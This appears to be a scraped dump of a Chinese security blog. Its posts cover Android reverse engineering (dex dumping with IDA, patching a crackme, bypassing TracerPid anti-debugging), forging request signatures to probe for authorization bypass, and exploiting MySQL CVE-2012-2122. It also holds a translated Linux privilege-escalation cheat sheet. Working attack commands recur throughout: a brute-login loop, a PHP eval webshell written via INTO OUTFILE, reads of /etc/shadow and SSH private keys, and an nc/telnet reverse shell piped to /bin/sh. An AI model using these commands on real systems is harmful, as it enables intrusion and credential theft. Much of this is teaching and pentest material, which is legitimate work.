5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。 2、示例演示首先调试模式启动APP， adb forward tcp:23946 tcp:23946 #IDA端口转发 adb shell am start -D -n 包名/activity名 #调试模式启动APP adb shell ps | grep 包名 #获取APP的PID adb forward tcp:8700 jdwp:pid #进程端口转发 然后调整IDA的调试选项，如下： 选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下： 找到方法后，在其第一行下断点，如下情形。 然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。 jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。 单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。 在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。 static main(void){ auto fp, dex_addr, end_addr; fp = fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr = R0 + R1; for ( dex_addr=R0; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); } 选择jadx打开dex文件，可以看到源码已dump成功。 3、系统差异此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。 脚本为 static main(void){ auto fp, dex_addr, end_addr; fp = fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr = R1 + R2; for ( dex_addr=R1; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); } 参考文章： IDA动态调试脱壳步骤","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ISCC Android Crackme","slug":"ISCC-Android-Crackme","date":"2019-04-30T01:47:32.000Z","updated":"2019-07-26T09:56:02.225Z","comments":true,"path":"2019/04/ISCC-Android-Crackme/","link":"","permalink":"/2019/04/ISCC-Android-Crackme/","excerpt":"","text":"ISCC Android Crackme此为2013年ISCC的一道移动题，相对简单的题，懂点 ARM 指令就差不多了。对于新入手安卓逆向可以做做看来练手。要求是注册为企业版程序。以下分析是建立在伪代码基础上，然后分析修改点，修改ARM汇编。 题目下载：APP 通过反编译代码简单查看功能逻辑，首先是从onCreate函数开始，函数一开始就调用了MyApp的m变量，查看对应的反编译代码。 MyApp是一个native方法的调用，调用了三个方法。 分别是initSN()、saveSN()、work()。并且执行了initSN方法，因此函数应该是注册码的对比和效验功能。 然后在回到以上的代码执行，点击按钮“执行功能”，进入toast弹出界面，通过判断m值来执行是否触发注册方法，默认为0触发，如果注册成功则调用work()函数来做执行功能。查看doRegister，点击确认后，程序进入com.bfs.crackme1.RegActivity类下， 方法判断是否输入注册码，调用saveSN来保存输入的注册码，然后弹窗关闭自身线程。到此，也基本确认了initSN的方法和上文判断一致。 看完基本的Java层函数现在来看so文件的相关代码实现和流程。 查看so的一些函数表，可以看到定义了JNI_Onload，Java层执行System.loadLibrary()后，将执行此函数。同样从函数表中可以看出加密处理为MD5。查看JNI_Onload做了什么处理。 查看伪代码，使用RegisterNatives实现JNI，而RegisterNatives是来做什么处理的，可以查看如下文章： JNI：使用RegisterNatives方法传递和使用Java自定义类 而此处的作用基本可以看到是用来自定义函数命名，不然native中的函数名为Java_com_bfs_crackme1_MainActivity_initSN这种类型，下面只有n1、n2、n3来代替以上方法。 查看n1方法，读取sdcard下的reg.dat文件，来进行MD5效对，要求进行企业版注册，能看到的是注册成功将使用setValue进行对v1的赋值，其中按照MainActivity文件中的判断，猜测3为企业版MD5值。 n2则为如下，读写的形式来对reg.dat 进行重写。 work函数则为如下： 至此，函数名则分析清楚，n1对应initSN，n2对应saveSN，n3对应work。根据函数流程可以大概猜出判断行为：n2保存来自输入的参数的MD5-&gt;n1读取参数进行对应是否为注册值-&gt;注册成功则set到内存一个值-&gt;由work来读取这个值判断注册是否成功以及功能执行。 所以理论上说，patch点有如下处： 1、修改reg.dat为企业版的注册码，修改Java层代码让其不走注册函数。 2、解密MD5值，直接输入注册 3、修改n1，让其返回值永远为3 4、修改work函数获取的v2值。 修改时，发现第一种并不行，Java层参数值修改后，可能n2做了其他相关处理，第二种是可行，毕竟都获取到了注册码，但需要解密成功，此MD5只是简单的32345678。 第三种修改n1： 输入肯定为错误或者不输入值，因此只需要修改值为空或者其他未知情况下的返回值。 .text:0000133C CMP R0, #0 .text:00001340 MOVEQ R1, #4 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 修改为： .text:0000133C MOV R0, #3 .text:00001340 MOVEQ R1, #3 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 让其在未输入的情况下返回企业版的返回值。修改编译安装后，打开即为企业版。 第四种修改work: .text:000014A0 10 40 2D E9 STMFD SP!, {R4,LR} .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B8 00 00 50 E3 CMP R0, #0 增加一条指令，修改为: .text:000014A0 10 40 2D E9 STMFD SP!, {R4,LR} .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B4 03 00 A0 E3 MOV R0, #3 .text:000014B8 00 00 50 E3 CMP R0, #0 这样达到从getvalue获取返回值后，重新修改v2的值为3，让其无论什么情况下都自动判断为已注册企业版。 网上其他的分析文章，同样是修改n1函数，只不过修改方式是同时修改几个mov语句，让其都赋值3来跳转判断。 详细文章：简单Android CrackMe分析","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"APP解密参数sign","slug":"APP解密参数sign","date":"2019-04-18T08:34:21.000Z","updated":"2019-07-26T09:56:16.713Z","comments":true,"path":"2019/04/APP解密参数sign/","link":"","permalink":"/2019/04/APP解密参数sign/","excerpt":"","text":"APP解密参数signAPP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加密字段进行so文件的逆向，查看后发现是Java层的加密，相对较简单。 首先抓包查看加密字段和相关参数值，可以看到一共有四个参数，其中sign是加密验证完整性字段 利用AK逆向APP包，搜索sign字段信息，但是搜索结果过多，查找较困难，但是sign是一个data参数字段，因此尝试更换其他字段搜索。 搜索reqData字段可以看到，搜索结果就smali文件存在，第一个为程序包，查看代码，利用jd来查看反编译Java代码。 搜索字段，可以看到如下所示，以下字段可以看出，程序对其四个字段的获取都有代表的变量，而我们只需要获取sign的变量，localObject2。 变量的值来源为t包的b方法，可以明显看到，值为nonce，tiestamp, localObject1, t.f的相加值。而localObject1为reqData的值。 查看t.b的方法，方法如下，对字段进行sha-256加密。查看a方法 public static String b(String paramString) { return a(paramString, &quot;SHA-256&quot;); } 其中t.a的执行为对指定的参数进行指定的加密，利用传入参数来确定。 public static String a(String paramString1, String paramString2) { try { paramString2 = MessageDigest.getInstance(paramString2); paramString2.update(paramString1.getBytes()); paramString1 = a(paramString2.digest()); return paramString1; } catch (Exception paramString1) { paramString1.printStackTrace(); } return null; } 而t.f代表的是一段加密公钥，此处不在列出，利用在线工具查看加密结果是否一致。可以看到加密后的参数和抓到的包结果一致。 那么就可以利用我们自己生成加密参数的方式来进行测试，例如如下脚本，通过判断响应返回的字段来获取参数值，查看是否越权等信息。 #coding : utf-8 import hashlib import requests headers = { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Cookie&#39;: &#39;JSESSIONID=xxxxxxx&#39;, &#39;User-Agent&#39;: &#39;okhttp/3.4.1&#39; } for i in range(60200000, 60295558): sha = &#39;MIICdgIBADAN.....TMK63hMPgm25mbCD0vKhsQtcSDlzVwtOOoNlW5E8CQQDNXVwGolFCqU9lb5147AHc+&lt;INF&gt;&lt;action&gt;...&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;LE8I2QTAFHJM3M.....1555571421812&#39; h = hashlib.sha256(sha) sha256 = h.hexdigest() data = &#39;reqData=&lt;INF&gt;&lt;action&gt;.....&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;&amp;nonce=LE8I2QTAFHJM3MO.....&amp;timestamp=1555571421812&amp;sign=&#39;+sha256 r = requests.post(&#39;http://xxxxxx/api&#39;, data = data, headers=headers) if &#39;xxxxxx&#39; in r.text: print i","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"MySQL历史漏洞分析","slug":"MySQL历史漏洞分析","date":"2019-04-12T06:05:30.000Z","updated":"2019-04-12T08:54:58.191Z","comments":true,"path":"2019/04/MySQL历史漏洞分析/","link":"","permalink":"/2019/04/MySQL历史漏洞分析/","excerpt":"","text":"MySQL历史漏洞分析前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题： 1、后台弱口令或者登陆绕过 2、mysql弱口令 3、ssh弱口令爆破 经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。 简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。 漏洞介绍： https://seclists.org/oss-sec/2012/q2/493 漏洞原因： my_bool check_scramble(const uchar *scramble_arg, const char *message, const uint8 *hash_stage2) { SHA1_CONTEXT sha1_context; uint8 buf[SHA1_HASH_SIZE]; uint8 hash_stage2_reassured[SHA1_HASH_SIZE]; mysql_sha1_reset(&amp;sha1_context); /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH); mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, buf); /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH); /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context); mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured); return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE); } 以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。 而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。 漏洞利用： 使用如下poc： for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done 环境采用vulhub的docker环境，测试成功后返回如下： 那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。 select user,password from mysql.user; MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。 还可以使用导出的形式，利用如下： Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;; #这种需要知道web路径 同样也可以使用load_file来查看系统文件等 SELECT LOAD_FILE(&#39;/etc/passwd&#39;)","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"逆向修改手机内核，绕过反调试","slug":"逆向修改手机内核，绕过反调试","date":"2019-04-02T05:59:49.000Z","updated":"2019-07-26T09:56:34.187Z","comments":true,"path":"2019/04/逆向修改手机内核，绕过反调试/","link":"","permalink":"/2019/04/逆向修改手机内核，绕过反调试/","excerpt":"","text":"逆向修改手机内核，绕过反调试Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。 一、 提取 zImage 内核文件查找boot文件位置 find / | grep boot cd /dev/block/platform/7824900.sdhci/by-name/ 将boot导出为boot.img dd if=/dev/block/mmcblk0p22 of=/sdcard/boot.img 把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。 adb pull /sdcard/boot.img d:\\a 然后下载bootimg解压boot文件： git clone https://github.com/pbatard/bootimg-tools.git make 此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel 提取原始zImage 将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。 修改完成后，解压缩文件，提取zImage 二、 提位、修改关键代码zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可） 点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000 原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。 echo 0 &gt; /proc/sys/kernel/kptr_restrict 关闭符号屏蔽 再输入以下命令查看这两函数的地址 cat /proc/kallsyms |grep proc_pid_status cat /proc/kallsyms |grep __task_pid_nr_ns 为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30 09)。 其对应的Hex窗口修改为如下所示： 使用gzip -n -f -9 zImage压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。 修改完成后，刷入手机，利用SDK自带的fastboot。 adb reboot bootloader # 启动fastboot模式 fastboot flash boot boot.img #刷入boot分区 fastboot reboot #重启 调试查看 如想使用修改函数操作指令的方式可以参考原作者方式： 1、逆向修改手机内核，绕过反调试 2、逆向修改内核，绕过TracerPID反调试","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"IDA动态调试","slug":"IDA动态调试","date":"2019-03-29T08:31:34.000Z","updated":"2019-07-26T09:56:06.610Z","comments":true,"path":"2019/03/IDA动态调试/","link":"","permalink":"/2019/03/IDA动态调试/","excerpt":"","text":"IDA 动态调试通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻辑和修改某些函数时，就需要IDA来进行操作啦。以下使用IDA版本7.0，小米手机 1、上传Android_Server文件存放在安装目录下的dbgsrv目录中，7.0以后版本多了几个其他版本的Android_server文件，上传Android_server文件到手机目录中，并提升执行权限。 adb push android_server /data/local/tmp/ chmod 755 android_server adb forward tcp:23946 tcp:23946 执行后就可以显示正在监听23946端口，如果报错，一般是使用位数和系统不一致。 2、调试启动APP以调试模式启动app adb shell am start -D -n 包名/.MainActivity 手机界面显示等待调试中，便可以进行下一步了。 3、查看APP PID调试进程进行端口转发，查看进程对应PID。 adb shell ps | grep 包名 adb forward tcp:8700 jdwp:pid 8700端口一般为默认的本地调试端口，如果不一致，可以在DDMS中查看。 4、IDA附加进程附加进程调试时，有时候需要对，如下的选项进行勾选，一般在需要动态加载so文件，调试JNI_onload函数的时候需要，对于一般调试静态函数的，需要拦取执行后断点的，可能连调试模式启动app都不需要。 选择后，便可以在attach to process选项中查看到相应的可调试进程了。如果没有进程可能是你的APP不能调试，需要添加可调试参数。或者直接修改ro.debuggable=1。 5、JDB附加执行jdb附加 jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 6、调试选择选择完成后，进入调试状态，在右边的modules栏可以看到加载进来的so文件。选择需要调试的so文件，如果没有看到需要的so文件，说明so文件是动态加载的，这时候F9运行，就可以看到相应的so文件了。 选择相应的so文件后，会显示so文件中的函数，选择对于函数即可。 7、调试断点如选择对于的JNI_Onload 函数，这时候界面会跳转到函数的起始位置，当然也可以使用基地址加偏移地址的方式寻找。找到函数位置后就可以F2下断点了。 断点执行后，点击F9再次运行，程序就可以执行到断点位置，当然有些是需要配合界面操作来执行。由于以上是抓取JNI_Onload函数，直接运行即可。 利用F8步过，F7步入进行调试即可。 对于调试结果，可以查看右侧寄存器变化，和下面的Hex View 变化值，来查看是否有需要的执行结果和函数值。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"基本Linux权限提升","slug":"基本Linux权限提升","date":"2019-03-18T05:49:53.000Z","updated":"2019-03-18T05:50:20.054Z","comments":true,"path":"2019/03/基本Linux权限提升/","link":"","permalink":"/2019/03/基本Linux权限提升/","excerpt":"","text":"原文链接：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 基本Linux权限提升枚举是关键。（Linux）权限升级就是： 收集 - *枚举，更多枚举和更多枚举。* 流程 - 对数据进行排序，分析和确定优先级。 搜索 - 了解要搜索的内容以及在何处查找漏洞利用代码。 适应 - *自定义漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。* 尝试 - 为（大量）试验和错误做好准备。 操作系统什么是分销类型？什么版本？cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based 什么是内核版本？是64位吗？cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 从环境变量中可以学到什么？cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 有打印机吗？lpstat -a 应用与服务正在运行什么服务？哪个服务具有哪个用户权限？ps aux ps -ef top cat /etc/services root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！ps aux | grep root ps -ef | grep root 安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/ 任何服务设置配置错误？是否附加了任何（易受攻击的）插件？cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ 安排了哪些工作？crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 任何纯文本用户名和/或密码？grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络系统有哪些NIC？它是否连接到另一个网络？/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 其他用户和主机与系统进行通信的是什么？lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 什么缓存？IP和/或MAC地址arp -e route /sbin/route -nee 数据包嗅探可能吗？可以看到什么tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port] 你有壳吗？你能和系统互动吗？nc -lvp 4444 # Attacker. Input (Commands) nc -lvp 4445 # Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP! ` 注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ 端口转发可能吗？重定向并与来自其他视图的流量进行交互注意：http：//www.boutell.com/rinetd/ 注意：http：//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch 注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip 注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port 注意：mknod backpipe p; nc -l -p [远程端口] 反向管道 mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道可能吗？远程本地发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig 机密信息和用户你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？id who w last cat /etc/passwd | cut -d: -f1 # List of users grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39; # List of super users awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd # List of super users cat /etc/sudoers sudo -l 可以找到哪些敏感文件？cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ 家庭导演中有什么“有趣”的东西？如果可以访问ls -ahlR /root/ ls -ahlR /home/ 是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 用户正在做什么？是否有明文密码？他们在编辑什么？cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history 可以找到哪些用户信息？cat ~/.bashrc cat ~/.profile cat /var/mail/root cat /var/spool/mail/root 可以找到私钥信息吗？cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key ` 文件系统哪些配置文件可以写在/ etc /中？能够重新配置服务吗？ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone ` 在/ var /中可以找到什么？ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 日志文件中是否有任何内容（可以帮助“本地文件包含”！） cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp ` 注：http：//www.thegeekstuff.com/2011/08/linux-var-log-files/ 如果命令有限，你会打破“监狱”外壳？python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i 如何安装文件系统？mount df -h 是否有任何未安装的文件系统？cat /etc/fstab 使用了什么“高级Linux文件权限”？find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null 哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shmfind / -writable -type d 2&gt;/dev/null # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null # world-writeable folders find / -perm -o x -type d 2&gt;/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null # world-writeable &amp; executable folders 任何“问题”文件？可写字，“无人”文件find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print # world-writeable files find /dir -xdev \\( -nouser -o -nogroup \\) -print # Noowner files 准备和寻找利用代码安装/支持哪些开发工具/语言？find / -name perl* find / -name python* find / -name gcc* find / -name cc 如何上传文件？find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 查找漏洞利用代码http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com 查找有关该漏洞利用的更多信息http://www.cvedetails.com http://packetstormsecurity.org/files/cve/[CVE] http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE] http://www.vulnview.com/cve-details.php?cvename=[CVE] （快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/ http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/ 缓解措施上述任何信息都很容易找到吗？试试吧！设置一个自动执行脚本和/或第三方产品的cron作业 系统是否完全打补丁？内核，操作系统，所有应用程序，插件和Web服务 apt-get update &amp;&amp; apt-get upgrade yum update 服务是否以最低权限级别运行？例如，您是否需要以root身份运行MySQL？ 脚本任何一个都可以自动化吗？！http://pentestmonkey.net/tools/unix-privesc-check/ http://labs.portcullis.co.uk/application/enum4linux/ http://bastille-linux.sourceforge.net","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Windows权限提升基础","slug":"Windows权限提升基础","date":"2019-03-18T05:29:26.000Z","updated":"2019-03-18T06:09:23.282Z","comments":true,"path":"2019/03/Windows权限提升基础/","link":"","permalink":"/2019/03/Windows权限提升基础/","excerpt":"","text":"原文链接：http://www.fuzzysecurity.com/tutorials/16.html Windows权限提升基础没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer … 